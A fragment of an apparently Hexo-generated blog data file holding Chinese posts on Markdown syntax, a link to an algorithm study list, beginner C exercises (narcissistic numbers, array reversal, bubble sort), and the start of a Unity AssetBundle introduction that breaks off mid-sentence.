title=\"1、标题的几种写法：\"></a>1、标题的几种写法：</h2><p>第一种：前面带#号，后面带文字，分别表示h1-h6,只到h6，而且h1下面会有一条横线，注意，#号后面有空格</p>\n<hr>\n<table>\n<thead>\n<tr>\n<th>写法</th>\n</tr>\n</thead>\n<tbody><tr>\n<td># 一级标题</td>\n</tr>\n<tr>\n<td>## 二级标题</td>\n</tr>\n<tr>\n<td>### 三级标题</td>\n</tr>\n<tr>\n<td>#### 四级标题</td>\n</tr>\n<tr>\n<td>##### 五级标题</td>\n</tr>\n<tr>\n<td>###### 六级标题</td>\n</tr>\n</tbody></table>\n<p>效果</p>\n<h1 id=\"一级标题\"><a href=\"#一级标题\" class=\"headerlink\" title=\"一级标题\"></a>一级标题</h1><h2 id=\"二级标题\"><a href=\"#二级标题\" class=\"headerlink\" title=\"二级标题\"></a>二级标题</h2><h3 id=\"三级标题\"><a href=\"#三级标题\" class=\"headerlink\" title=\"三级标题\"></a>三级标题</h3><h4 id=\"四级标题\"><a href=\"#四级标题\" class=\"headerlink\" title=\"四级标题\"></a>四级标题</h4><h5 id=\"五级标题\"><a href=\"#五级标题\" class=\"headerlink\" title=\"五级标题\"></a>五级标题</h5><h6 id=\"六级标题\"><a href=\"#六级标题\" class=\"headerlink\" title=\"六级标题\"></a>六级标题</h6><hr>\n<p>第二种：这种方式好像只能表示一级和二级标题，而且=和-的数量没有限制，只要大于一个就行</p>\n<table>\n<thead>\n<tr>\n<th>写法</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>这是一级标题</td>\n</tr>\n<tr>\n<td>===========</td>\n</tr>\n<tr>\n<td>这是二级标题</td>\n</tr>\n<tr>\n<td>————-</td>\n</tr>\n<tr>\n<td>正文</td>\n</tr>\n<tr>\n<td>————-</td>\n</tr>\n<tr>\n<td>辅文</td>\n</tr>\n</tbody></table>\n<p>效果 </p>\n<h1 id=\"这是一级标题\"><a href=\"#这是一级标题\" class=\"headerlink\" title=\"这是一级标题                            \"></a>这是一级标题                            </h1><h2 id=\"这是二级标题\"><a href=\"#这是二级标题\" class=\"headerlink\" title=\"这是二级标题                 \"></a>这是二级标题                 </h2><p>正文:<br>xxx<br>xxx     </p>\n<hr>\n<p>辅文:<br>xxxx        </p>\n<hr>\n<p>第三种：<br>写法|<br>—|</p>\n<h1 id=\"一级标题-1\"><a href=\"#一级标题-1\" class=\"headerlink\" title=\"一级标题 #          |\"></a>一级标题 #          |</h1><h2 id=\"二级标题-1\"><a href=\"#二级标题-1\" class=\"headerlink\" title=\"二级标题 ##         |\"></a>二级标题 ##         |</h2><h3 id=\"三级标题-1\"><a href=\"#三级标题-1\" class=\"headerlink\" title=\"三级标题 ###         |\"></a>三级标题 ###         |</h3><h4 id=\"四级标题-1\"><a href=\"#四级标题-1\" class=\"headerlink\" title=\"四级标题 ####       |\"></a>四级标题 ####       |</h4><h5 id=\"五级标题-1\"><a href=\"#五级标题-1\" class=\"headerlink\" title=\"五级标题 #####      |\"></a>五级标题 #####      |</h5><h6 id=\"六级标题-1\"><a href=\"#六级标题-1\" class=\"headerlink\" title=\"六级标题 ######     |\"></a>六级标题 ######     |</h6><p><a href=\"https://tool.oschina.net/markdown/\" target=\"_blank\" rel=\"noopener\">markdown在线编辑</a></p>\n<h2 id=\"2、列表\"><a href=\"#2、列表\" class=\"headerlink\" title=\"2、列表\"></a>2、列表</h2><table>\n<thead>\n<tr>\n<th>无序列表写法</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>* 1</td>\n</tr>\n<tr>\n<td>* 2</td>\n</tr>\n<tr>\n<td>* 3</td>\n</tr>\n<tr>\n<td>+ 1</td>\n</tr>\n<tr>\n<td>+ 2</td>\n</tr>\n<tr>\n<td>+ 3</td>\n</tr>\n<tr>\n<td>- 1</td>\n</tr>\n<tr>\n<td>- 2</td>\n</tr>\n<tr>\n<td>- 3</td>\n</tr>\n</tbody></table>\n<p>效果</p>\n<ul>\n<li>1                     </li>\n<li>2                </li>\n<li>3               </li>\n</ul>\n<ul>\n<li>1                    </li>\n<li>2               </li>\n<li>3         </li>\n</ul>\n<ul>\n<li>1                  </li>\n<li>2               </li>\n<li>3        </li>\n</ul>\n<p>有序列表就相对简单一点，只有这一种方式，注意，数字后面的点只能是英文的点，特别注意，有序列表的序号是根据第一行列表的数字顺序来的.</p>\n<table>\n<thead>\n<tr>\n<th>有序列表写法</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1. 列表 1</td>\n</tr>\n<tr>\n<td>2. 列表 2</td>\n</tr>\n<tr>\n<td>3. 列表 3</td>\n</tr>\n</tbody></table>\n<p>效果</p>\n<ol>\n<li><p>列表 1                   </p>\n</li>\n<li><p>列表 2               </p>\n</li>\n<li><p>列表 3              </p>\n<p>有序列表写法|</p>\n</li>\n</ol>\n<p>—|<br>3. 列表 1        |<br>8. 列表 2        |<br>4. 列表 3        | </p>\n<p>效果</p>\n<ol start=\"3\">\n<li>列表 1                   </li>\n<li>列表 2               </li>\n<li>列表 3 </li>\n</ol>\n<hr>\n<h2 id=\"3、区块引用\"><a href=\"#3、区块引用\" class=\"headerlink\" title=\"3、区块引用\"></a>3、区块引用</h2><table>\n<thead>\n<tr>\n<th>写法</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>* AAAAAAAAAA</td>\n</tr>\n<tr>\n<td>&gt; BBBBBBBBBB</td>\n</tr>\n<tr>\n<td>&gt; ## 标题</td>\n</tr>\n<tr>\n<td>下面为嵌套引用:</td>\n</tr>\n<tr>\n<td>&gt; CCCCCCCCCC</td>\n</tr>\n<tr>\n<td>&gt;&gt; dddDDDDDD</td>\n</tr>\n<tr>\n<td>&gt;&gt;&gt; E</td>\n</tr>\n<tr>\n<td>&gt;&gt;&gt;&gt; f</td>\n</tr>\n<tr>\n<td>&gt;&gt;&gt;&gt;&gt; G</td>\n</tr>\n<tr>\n<td>比如说，你想对某个部分做的内容做一些说明或者引用某某的话等，可以用这个语句</td>\n</tr>\n<tr>\n<td>* 无序列表下方的便是引用，可以有多种用途，看你的需求了，用法就是在语句前面加一个 &gt; ，注意是英文的那个右尖括号，注意空格</td>\n</tr>\n<tr>\n<td>&gt;引用因为是一个区块，理论上是应该什么内容都可以放，比如说：标题，列表，引用等等，看看下图：</td>\n</tr>\n</tbody></table>\n<p>想要在上一次引用中嵌套一层引用，只需多加一个&gt;，理论上可以无限嵌套，我就不整那么多了，注意：多层嵌套的&gt;是不需要连续在一起的，只要在一行就可以了，中间允许有空格，但是为了好看，还是把排版搞好吧</p>\n<hr>\n<h2 id=\"4、华丽的分割线\"><a href=\"#4、华丽的分割线\" class=\"headerlink\" title=\"4、华丽的分割线\"></a>4、华丽的分割线</h2><p>分割线可以由* - _（星号，减号，底线）这3个符号的至少3个符号表示，注意至少要3个，且不需要连续，有空格也可以</p>\n<table>\n<thead>\n<tr>\n<th>写法</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>***</td>\n</tr>\n<tr>\n<td><strong>**</strong></td>\n</tr>\n<tr>\n<td>—</td>\n</tr>\n<tr>\n<td>- - -</td>\n</tr>\n<tr>\n<td>* * *</td>\n</tr>\n<tr>\n<td>————</td>\n</tr>\n<tr>\n<td>_ _ _</td>\n</tr>\n</tbody></table>\n<p>效果</p>\n<hr>\n<hr>\n<hr>\n<hr>\n<hr>\n<hr>\n<hr>\n<p>应该看得懂吧，但是为了代码的排版好看，你们自己定规则吧，前面有用到星号，建议用减号</p>\n<hr>\n<p>5、链接</p>\n<p>支持2种链接方式：行内式和参数式，不管是哪一种，链接文字都是用 [方括号] 来标记。<br>行内式的链接格式是：链接的文字放在[]中，链接地址放在随后的（）中：链接还可以带title属性，好像也只能带title，带不了其他属性，注意，是链接地址后面空一格，然后用引号引起来,就是把链接当成参数<br>写法|<br>—|<br>注意下面写法,中间不要空格                               |<br>[ xxx ]  ( <a href=\"http://www.baidu.com\" target=\"_blank\" rel=\"noopener\">http://www.baidu.com</a> )                   |<br>[[   name  ]] :  <a href=\"http://www.baidu.com\" target=\"_blank\" rel=\"noopener\">http://www.baidu.com</a>    “名称”            |<br>[[   home  ]] :  <a href=\"http://www.baidu.com\" target=\"_blank\" rel=\"noopener\">http://www.baidu.com</a>    “ 首页”           |<br>[[   也支持中文   ]] : <a href=\"http://www.baidu.com\" target=\"_blank\" rel=\"noopener\">http://www.baidu.com</a>    “ 瞎写的”       |<br>这里是[[ name ]],这里是 [[ home ]] ,这里是 [[ 也支持中文 ]]   |</p>\n<p>效果:</p>\n<p><a href=\"http://www.baidu.com\" target=\"_blank\" rel=\"noopener\">百度</a>         </p>\n<p>这里是<a href=\"http://www.baidu.com\" target=\"_blank\" rel=\"noopener\" title=\"名称\">name</a>,这里是<a href=\"http://www.baidu.com\" target=\"_blank\" rel=\"noopener\" title=\" 首页\">home</a>,这里是<a href=\"http://www.baidu.com\" target=\"_blank\" rel=\"noopener\" title=\" 瞎写的\">也支持中文</a></p>\n<hr>\n<p>6、图片<br>图片也有2种方式：行内式和参数式，<br>写法|<br>—|<br>注意下面写法,中间不要空格,行内式和参数式                              |<br>! [ xxx ]  ( <a href=\"https://images2015.cnblogs.com/blog/600165/201701/600165-20170121185054312-549083784.png\" target=\"_blank\" rel=\"noopener\">https://images2015.cnblogs.com/blog/600165/201701/600165-20170121185054312-549083784.png</a> )                      |<br>[ CCC ]: <a href=\"https://images2015.cnblogs.com/blog/600165/201701/600165-20170121185106031-1426410254.png\" target=\"_blank\" rel=\"noopener\">https://images2015.cnblogs.com/blog/600165/201701/600165-20170121185106031-1426410254.png</a>                       |<br>参数式图片这里是 ![CCC]                             |   </p>\n<p>效果</p>\n<p><img src=\"https://images2015.cnblogs.com/blog/600165/201701/600165-20170121185054312-549083784.png\" alt=\"xxx\">        </p>\n<p>参数式图片这里是: <img src=\"https://images2015.cnblogs.com/blog/600165/201701/600165-20170121185106031-1426410254.png\" alt=\"AAA\">                                </p>\n<p>7、代码框<br>写法|<br>—|<br>单行用 <code>, 多行用 ```  |</code>                      |<br>``                      |   </p>\n<pre><code class=\"|\">```                      |  \n\n效果\n\n``\n    单行代码效果\n    1111\n``\n</code></pre>\n<pre><code>多行代码效果 1\n多行代码效果 2</code></pre><pre><code>\n*** \n\n## 8、表格\n\n写法|\n---|\n学号\\|姓名\\|分数        |\n--\\|--\\|--                 |\nAA\\|bb\\|CC                 |\nDD\\|EE\\|FF                 |\nQQ\\|EW\\|FR                 |\n\n效果\n\n学号|姓名|分数        |\n--|--|--                 |\nAA|bb|CC                 |\nDD|EE|FF                 |\nQQ|EW|FR                 |\n\n***\n\n\n## 9、强调\n\n写法|\n---|\n\\*字体倾斜\\* |\n\\_字体倾斜\\_ |\n\\*\\*字体加粗\\*\\* |\n\\_\\_字体加粗\\_\\_ |\n\n效果\n\n*字体倾斜*      \n_字体倾斜_      \n**字体加粗**        \n__字体加粗__        \n\n***\n## 10、转义前面加 \\\\\n\n*** \n\n## 11、删除线左右加 ~~\n~~ 删除线 ~~        \n~~删除线~~\n\n</code></pre>"},{"title":"学习算法大纲","date":"2020-05-08T03:41:32.000Z","_content":"\n# 需要掌握的算法\n* https://www.zhihu.com/question/23148377/answer/863990767?utm_source=hot_content_share&utm_medium=billboard&from=singlemessage","source":"_posts/algorithm/algorithm.md","raw":"---\ntitle: 学习算法大纲\ndate: 2020-05-08 11:41:32\ncategories:\n- 算法\ntags:\n- 算法\n---\n\n# 需要掌握的算法\n* https://www.zhihu.com/question/23148377/answer/863990767?utm_source=hot_content_share&utm_medium=billboard&from=singlemessage","slug":"algorithm/algorithm","published":1,"updated":"2020-05-15T02:52:08.670Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8cym001f2gk758f983ft","content":"<h1 id=\"需要掌握的算法\"><a href=\"#需要掌握的算法\" class=\"headerlink\" title=\"需要掌握的算法\"></a>需要掌握的算法</h1><ul>\n<li><a href=\"https://www.zhihu.com/question/23148377/answer/863990767?utm_source=hot_content_share&amp;utm_medium=billboard&amp;from=singlemessage\" target=\"_blank\" rel=\"noopener\">https://www.zhihu.com/question/23148377/answer/863990767?utm_source=hot_content_share&amp;utm_medium=billboard&amp;from=singlemessage</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"需要掌握的算法\"><a href=\"#需要掌握的算法\" class=\"headerlink\" title=\"需要掌握的算法\"></a>需要掌握的算法</h1><ul>\n<li><a href=\"https://www.zhihu.com/question/23148377/answer/863990767?utm_source=hot_content_share&amp;utm_medium=billboard&amp;from=singlemessage\" target=\"_blank\" rel=\"noopener\">https://www.zhihu.com/question/23148377/answer/863990767?utm_source=hot_content_share&amp;utm_medium=billboard&amp;from=singlemessage</a></li>\n</ul>\n"},{"title":"C基础案例","date":"2020-05-08T03:41:32.000Z","_content":"\n# 案例1,水仙花数\n\n输出0-1000以内的水仙花数,水仙花算法:一个数=它的各位的立方和,例如:153=1 * 1 * 1 + 5 * 5 * 5 + 3 * 3 * 3. 提示:for循环取余(%),取整(/)运算符;\n```\n    for (int i = 0; i < 1000; i++) {\n        int baiWeiShu = i / 100 %10;                //百位数\n        int geWeiShu = i/1 % 10;                  //个位数\n        int shiWeiShu = i / 10 %10 ;      //十位数\n        int resault = baiWeiShu * baiWeiShu * baiWeiShu + shiWeiShu * shiWeiShu * shiWeiShu + geWeiShu * geWeiShu * geWeiShu;\n        if (i == resault) {\n            printf(\"水仙花数:%d\\n\", i);\n        }\n    }\n    设一个数为n，则在C语言中其个位、十位、百位、千位依次这样计算：\n    n/1%10，n/10%10，n/100%10，n/1000%10\n    代码如下：\n    #include<stdio.h>\n    int main(){\n        int n = 123456;\n        int unitPlace = n / 1 % 10;\n        int tenPlace = n / 10 % 10;\n        int hundredPlace = n / 100 % 10;\n        int thousandPlace = n / 1000 % 10;\n        printf(\"个位:%d\\n十位:%d\\n百位:%d\\n千位:%d\\n\", unitPlace, tenPlace, hundredPlace, thousandPlace);\n        getchar();\n        return 0;\n    }\n\n```\n\n# 案例2,数组翻转\n将int类型的数组进行翻转操作\n```\n    //数组翻转,两头堵模型\n    int array[] = { 3, 7, 79, 465, 2, 65, -346, 798, 1, 0 };\n    int size = sizeof(array) / sizeof(array[0]);\n\n    for (int i = 0; i < size / 2; i++) {\n        int temp = array[i];\n        array[i] = array[size - 1 - i];\n        array[size - 1 - i] = temp;\n    }\n\n    for (int i = 0; i < size; i++) {\n        printf(\"%d\\n\", array[i]);\n    }\n```\n\n# 案例3,冒泡排序\n```\nvoid BubblingSorting()\n{\n    //冒泡排序\n    int array[] = {  7, 79, 465,  65, -345, -346, 798, 1, 0, 45 };\n    int size = sizeof(array) / sizeof(array[0]);\n\n    // 在 for (int x = 0; x < size; x++) 中,可以取出所有的值,但是比较是可以少取一次的\n    // 因为 array[x]取出当前的一个值,array[x+1]取出下一个值,这样取值,for循环中必须少循环一次\n    // 必须写成 for (int x = 0; x < size -1 ; x++) 才可以正常使用array[x+1]取出下一个值\n    // 第一次相邻的2个数字循环比较完成之后,数组的最后一个值必定是当前数组中的最大或者最小的值,\n    // 第二次相邻的2个数字循环比较完成之后,数组的倒数第二个值必定是当前数组中的最大或者最小的值,\n    // 第三次相邻的2个数字循环比较完成之后,数组的倒数第三个值必定是当前数组中的最大或者最小的值,\n    // ...\n    // 所以每次执行完一个比较循环之后,数组的倒数的值就不必要参与比较循环中,即如果共有10个数\n    // 第n次比较(外层循环)   遍历的比较循环     倒数第x个值不参与比较    比较的下标从 i 到 j(内层循环)\n    //   1(0)                   9                  无                           0    9\n    //   2(1)                   8                  1                            0    8\n    //   3(2)                   7                  2                            0    7\n    //   4(3)                   6                  3                            0    6\n    //   5(4)                   5                  4                            0    5\n    //   6(5)                   4                  5                            0    4\n    //   7(6)                   3                  6                            0    3\n    //   8(7)                   2                  7                            0    2\n    //   9(8)                   1                  8                            0    1\n    int count = 0;\n    for (int i = 0; i < size - 1; i++) {\n        for (int j = 0; j < size - 1 - i; j++) {\n            printf(\"%d      %d\\n\", j, j + 1);\n            if (array[j] > array[j + 1]) {\n                int temp = array[j];\n                array[j] =   array[j + 1];\n                array[j + 1] = temp;\n            }\n        }\n        count++;\n        printf(\"=================%d\\n\", i);\n    }\n    printf(\"=================count = %d\\n\", count);\n\n    for (int i = 0; i < size; i++) {\n        printf(\"%d\\n\", array[i]);\n    }\n}\n```","source":"_posts/algorithm/案例.md","raw":"---\ntitle: C基础案例\ndate: 2020-05-08 11:41:32\ncategories:\n- 算法\ntags:\n- 算法\n---\n\n# 案例1,水仙花数\n\n输出0-1000以内的水仙花数,水仙花算法:一个数=它的各位的立方和,例如:153=1 * 1 * 1 + 5 * 5 * 5 + 3 * 3 * 3. 提示:for循环取余(%),取整(/)运算符;\n```\n    for (int i = 0; i < 1000; i++) {\n        int baiWeiShu = i / 100 %10;                //百位数\n        int geWeiShu = i/1 % 10;                  //个位数\n        int shiWeiShu = i / 10 %10 ;      //十位数\n        int resault = baiWeiShu * baiWeiShu * baiWeiShu + shiWeiShu * shiWeiShu * shiWeiShu + geWeiShu * geWeiShu * geWeiShu;\n        if (i == resault) {\n            printf(\"水仙花数:%d\\n\", i);\n        }\n    }\n    设一个数为n，则在C语言中其个位、十位、百位、千位依次这样计算：\n    n/1%10，n/10%10，n/100%10，n/1000%10\n    代码如下：\n    #include<stdio.h>\n    int main(){\n        int n = 123456;\n        int unitPlace = n / 1 % 10;\n        int tenPlace = n / 10 % 10;\n        int hundredPlace = n / 100 % 10;\n        int thousandPlace = n / 1000 % 10;\n        printf(\"个位:%d\\n十位:%d\\n百位:%d\\n千位:%d\\n\", unitPlace, tenPlace, hundredPlace, thousandPlace);\n        getchar();\n        return 0;\n    }\n\n```\n\n# 案例2,数组翻转\n将int类型的数组进行翻转操作\n```\n    //数组翻转,两头堵模型\n    int array[] = { 3, 7, 79, 465, 2, 65, -346, 798, 1, 0 };\n    int size = sizeof(array) / sizeof(array[0]);\n\n    for (int i = 0; i < size / 2; i++) {\n        int temp = array[i];\n        array[i] = array[size - 1 - i];\n        array[size - 1 - i] = temp;\n    }\n\n    for (int i = 0; i < size; i++) {\n        printf(\"%d\\n\", array[i]);\n    }\n```\n\n# 案例3,冒泡排序\n```\nvoid BubblingSorting()\n{\n    //冒泡排序\n    int array[] = {  7, 79, 465,  65, -345, -346, 798, 1, 0, 45 };\n    int size = sizeof(array) / sizeof(array[0]);\n\n    // 在 for (int x = 0; x < size; x++) 中,可以取出所有的值,但是比较是可以少取一次的\n    // 因为 array[x]取出当前的一个值,array[x+1]取出下一个值,这样取值,for循环中必须少循环一次\n    // 必须写成 for (int x = 0; x < size -1 ; x++) 才可以正常使用array[x+1]取出下一个值\n    // 第一次相邻的2个数字循环比较完成之后,数组的最后一个值必定是当前数组中的最大或者最小的值,\n    // 第二次相邻的2个数字循环比较完成之后,数组的倒数第二个值必定是当前数组中的最大或者最小的值,\n    // 第三次相邻的2个数字循环比较完成之后,数组的倒数第三个值必定是当前数组中的最大或者最小的值,\n    // ...\n    // 所以每次执行完一个比较循环之后,数组的倒数的值就不必要参与比较循环中,即如果共有10个数\n    // 第n次比较(外层循环)   遍历的比较循环     倒数第x个值不参与比较    比较的下标从 i 到 j(内层循环)\n    //   1(0)                   9                  无                           0    9\n    //   2(1)                   8                  1                            0    8\n    //   3(2)                   7                  2                            0    7\n    //   4(3)                   6                  3                            0    6\n    //   5(4)                   5                  4                            0    5\n    //   6(5)                   4                  5                            0    4\n    //   7(6)                   3                  6                            0    3\n    //   8(7)                   2                  7                            0    2\n    //   9(8)                   1                  8                            0    1\n    int count = 0;\n    for (int i = 0; i < size - 1; i++) {\n        for (int j = 0; j < size - 1 - i; j++) {\n            printf(\"%d      %d\\n\", j, j + 1);\n            if (array[j] > array[j + 1]) {\n                int temp = array[j];\n                array[j] =   array[j + 1];\n                array[j + 1] = temp;\n            }\n        }\n        count++;\n        printf(\"=================%d\\n\", i);\n    }\n    printf(\"=================count = %d\\n\", count);\n\n    for (int i = 0; i < size; i++) {\n        printf(\"%d\\n\", array[i]);\n    }\n}\n```","slug":"algorithm/案例","published":1,"updated":"2020-08-03T01:45:54.540Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8cyn001i2gk7aepw9qdy","content":"<h1 id=\"案例1-水仙花数\"><a href=\"#案例1-水仙花数\" class=\"headerlink\" title=\"案例1,水仙花数\"></a>案例1,水仙花数</h1><p>输出0-1000以内的水仙花数,水仙花算法:一个数=它的各位的立方和,例如:153=1 * 1 * 1 + 5 * 5 * 5 + 3 * 3 * 3. 提示:for循环取余(%),取整(/)运算符;</p>\n<pre><code>    for (int i = 0; i &lt; 1000; i++) {\n        int baiWeiShu = i / 100 %10;                //百位数\n        int geWeiShu = i/1 % 10;                  //个位数\n        int shiWeiShu = i / 10 %10 ;      //十位数\n        int resault = baiWeiShu * baiWeiShu * baiWeiShu + shiWeiShu * shiWeiShu * shiWeiShu + geWeiShu * geWeiShu * geWeiShu;\n        if (i == resault) {\n            printf(&quot;水仙花数:%d\\n&quot;, i);\n        }\n    }\n    设一个数为n，则在C语言中其个位、十位、百位、千位依次这样计算：\n    n/1%10，n/10%10，n/100%10，n/1000%10\n    代码如下：\n    #include&lt;stdio.h&gt;\n    int main(){\n        int n = 123456;\n        int unitPlace = n / 1 % 10;\n        int tenPlace = n / 10 % 10;\n        int hundredPlace = n / 100 % 10;\n        int thousandPlace = n / 1000 % 10;\n        printf(&quot;个位:%d\\n十位:%d\\n百位:%d\\n千位:%d\\n&quot;, unitPlace, tenPlace, hundredPlace, thousandPlace);\n        getchar();\n        return 0;\n    }\n</code></pre><h1 id=\"案例2-数组翻转\"><a href=\"#案例2-数组翻转\" class=\"headerlink\" title=\"案例2,数组翻转\"></a>案例2,数组翻转</h1><p>将int类型的数组进行翻转操作</p>\n<pre><code>    //数组翻转,两头堵模型\n    int array[] = { 3, 7, 79, 465, 2, 65, -346, 798, 1, 0 };\n    int size = sizeof(array) / sizeof(array[0]);\n\n    for (int i = 0; i &lt; size / 2; i++) {\n        int temp = array[i];\n        array[i] = array[size - 1 - i];\n        array[size - 1 - i] = temp;\n    }\n\n    for (int i = 0; i &lt; size; i++) {\n        printf(&quot;%d\\n&quot;, array[i]);\n    }</code></pre><h1 id=\"案例3-冒泡排序\"><a href=\"#案例3-冒泡排序\" class=\"headerlink\" title=\"案例3,冒泡排序\"></a>案例3,冒泡排序</h1><pre><code>void BubblingSorting()\n{\n    //冒泡排序\n    int array[] = {  7, 79, 465,  65, -345, -346, 798, 1, 0, 45 };\n    int size = sizeof(array) / sizeof(array[0]);\n\n    // 在 for (int x = 0; x &lt; size; x++) 中,可以取出所有的值,但是比较是可以少取一次的\n    // 因为 array[x]取出当前的一个值,array[x+1]取出下一个值,这样取值,for循环中必须少循环一次\n    // 必须写成 for (int x = 0; x &lt; size -1 ; x++) 才可以正常使用array[x+1]取出下一个值\n    // 第一次相邻的2个数字循环比较完成之后,数组的最后一个值必定是当前数组中的最大或者最小的值,\n    // 第二次相邻的2个数字循环比较完成之后,数组的倒数第二个值必定是当前数组中的最大或者最小的值,\n    // 第三次相邻的2个数字循环比较完成之后,数组的倒数第三个值必定是当前数组中的最大或者最小的值,\n    // ...\n    // 所以每次执行完一个比较循环之后,数组的倒数的值就不必要参与比较循环中,即如果共有10个数\n    // 第n次比较(外层循环)   遍历的比较循环     倒数第x个值不参与比较    比较的下标从 i 到 j(内层循环)\n    //   1(0)                   9                  无                           0    9\n    //   2(1)                   8                  1                            0    8\n    //   3(2)                   7                  2                            0    7\n    //   4(3)                   6                  3                            0    6\n    //   5(4)                   5                  4                            0    5\n    //   6(5)                   4                  5                            0    4\n    //   7(6)                   3                  6                            0    3\n    //   8(7)                   2                  7                            0    2\n    //   9(8)                   1                  8                            0    1\n    int count = 0;\n    for (int i = 0; i &lt; size - 1; i++) {\n        for (int j = 0; j &lt; size - 1 - i; j++) {\n            printf(&quot;%d      %d\\n&quot;, j, j + 1);\n            if (array[j] &gt; array[j + 1]) {\n                int temp = array[j];\n                array[j] =   array[j + 1];\n                array[j + 1] = temp;\n            }\n        }\n        count++;\n        printf(&quot;=================%d\\n&quot;, i);\n    }\n    printf(&quot;=================count = %d\\n&quot;, count);\n\n    for (int i = 0; i &lt; size; i++) {\n        printf(&quot;%d\\n&quot;, array[i]);\n    }\n}</code></pre>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"案例1-水仙花数\"><a href=\"#案例1-水仙花数\" class=\"headerlink\" title=\"案例1,水仙花数\"></a>案例1,水仙花数</h1><p>输出0-1000以内的水仙花数,水仙花算法:一个数=它的各位的立方和,例如:153=1 * 1 * 1 + 5 * 5 * 5 + 3 * 3 * 3. 提示:for循环取余(%),取整(/)运算符;</p>\n<pre><code>    for (int i = 0; i &lt; 1000; i++) {\n        int baiWeiShu = i / 100 %10;                //百位数\n        int geWeiShu = i/1 % 10;                  //个位数\n        int shiWeiShu = i / 10 %10 ;      //十位数\n        int resault = baiWeiShu * baiWeiShu * baiWeiShu + shiWeiShu * shiWeiShu * shiWeiShu + geWeiShu * geWeiShu * geWeiShu;\n        if (i == resault) {\n            printf(&quot;水仙花数:%d\\n&quot;, i);\n        }\n    }\n    设一个数为n，则在C语言中其个位、十位、百位、千位依次这样计算：\n    n/1%10，n/10%10，n/100%10，n/1000%10\n    代码如下：\n    #include&lt;stdio.h&gt;\n    int main(){\n        int n = 123456;\n        int unitPlace = n / 1 % 10;\n        int tenPlace = n / 10 % 10;\n        int hundredPlace = n / 100 % 10;\n        int thousandPlace = n / 1000 % 10;\n        printf(&quot;个位:%d\\n十位:%d\\n百位:%d\\n千位:%d\\n&quot;, unitPlace, tenPlace, hundredPlace, thousandPlace);\n        getchar();\n        return 0;\n    }\n</code></pre><h1 id=\"案例2-数组翻转\"><a href=\"#案例2-数组翻转\" class=\"headerlink\" title=\"案例2,数组翻转\"></a>案例2,数组翻转</h1><p>将int类型的数组进行翻转操作</p>\n<pre><code>    //数组翻转,两头堵模型\n    int array[] = { 3, 7, 79, 465, 2, 65, -346, 798, 1, 0 };\n    int size = sizeof(array) / sizeof(array[0]);\n\n    for (int i = 0; i &lt; size / 2; i++) {\n        int temp = array[i];\n        array[i] = array[size - 1 - i];\n        array[size - 1 - i] = temp;\n    }\n\n    for (int i = 0; i &lt; size; i++) {\n        printf(&quot;%d\\n&quot;, array[i]);\n    }</code></pre><h1 id=\"案例3-冒泡排序\"><a href=\"#案例3-冒泡排序\" class=\"headerlink\" title=\"案例3,冒泡排序\"></a>案例3,冒泡排序</h1><pre><code>void BubblingSorting()\n{\n    //冒泡排序\n    int array[] = {  7, 79, 465,  65, -345, -346, 798, 1, 0, 45 };\n    int size = sizeof(array) / sizeof(array[0]);\n\n    // 在 for (int x = 0; x &lt; size; x++) 中,可以取出所有的值,但是比较是可以少取一次的\n    // 因为 array[x]取出当前的一个值,array[x+1]取出下一个值,这样取值,for循环中必须少循环一次\n    // 必须写成 for (int x = 0; x &lt; size -1 ; x++) 才可以正常使用array[x+1]取出下一个值\n    // 第一次相邻的2个数字循环比较完成之后,数组的最后一个值必定是当前数组中的最大或者最小的值,\n    // 第二次相邻的2个数字循环比较完成之后,数组的倒数第二个值必定是当前数组中的最大或者最小的值,\n    // 第三次相邻的2个数字循环比较完成之后,数组的倒数第三个值必定是当前数组中的最大或者最小的值,\n    // ...\n    // 所以每次执行完一个比较循环之后,数组的倒数的值就不必要参与比较循环中,即如果共有10个数\n    // 第n次比较(外层循环)   遍历的比较循环     倒数第x个值不参与比较    比较的下标从 i 到 j(内层循环)\n    //   1(0)                   9                  无                           0    9\n    //   2(1)                   8                  1                            0    8\n    //   3(2)                   7                  2                            0    7\n    //   4(3)                   6                  3                            0    6\n    //   5(4)                   5                  4                            0    5\n    //   6(5)                   4                  5                            0    4\n    //   7(6)                   3                  6                            0    3\n    //   8(7)                   2                  7                            0    2\n    //   9(8)                   1                  8                            0    1\n    int count = 0;\n    for (int i = 0; i &lt; size - 1; i++) {\n        for (int j = 0; j &lt; size - 1 - i; j++) {\n            printf(&quot;%d      %d\\n&quot;, j, j + 1);\n            if (array[j] &gt; array[j + 1]) {\n                int temp = array[j];\n                array[j] =   array[j + 1];\n                array[j + 1] = temp;\n            }\n        }\n        count++;\n        printf(&quot;=================%d\\n&quot;, i);\n    }\n    printf(&quot;=================count = %d\\n&quot;, count);\n\n    for (int i = 0; i &lt; size; i++) {\n        printf(&quot;%d\\n&quot;, array[i]);\n    }\n}</code></pre>"},{"title":"AssetBundle 介绍","date":"2020-05-08T03:41:32.000Z","_content":"\n\n# 概念\n* 1 AssetBundle 是一个存档文件,包含可在运行时加载的特定于平台的资源（模型、纹理、预制件、音频剪辑甚至整个场景);AssetBundle 可以表达彼此之间的依赖关系;目前一般情况下采用 LZ4 压缩方式\n* 2 AssetBundle包含 2 种东西,序列化文件和资源文件;序列化文件包含分解为各个对象并写入此单个文件的资源,依赖关系,映射等;资源文件只是为某些资源（纹理和音频）单独存储的二进制数据块，允许我们有效地在另一个线程上从磁盘加载它们.\n* 3 打包分为随包资源,以及增量包资源(热更资源).随包资源跟随 apk,ipa 进行安装;将打的增量包上传到平台资源发布(CDN)服务器,游戏内进行下载;\n\n# 本地开发使用的 API\n* 1 打 AB 包的 API,在调用 API 之前,需要给资源设置 AssetBundle 名称,可以自动也可以手动,基本上写一套自动设置名字的策略:\n```\nBuildPipeline.BuildAssetBundles(\"路径,必须是英文\", BuildAssetBundleOptions.xxx, BuildTarget.xxx);\nBuildAssetBundleOptions.None:采用LZMA压缩,不建议使用\nBuildAssetBundleOptions.UncompressedAssetBundle:不压缩,不建议使用\nBuildAssetBundleOptions.ChunkBasedCompression:采用 LZ4 的压缩方法,建议使用\n清单捆绑包:此包以其所在的目录（构建 AssetBundle 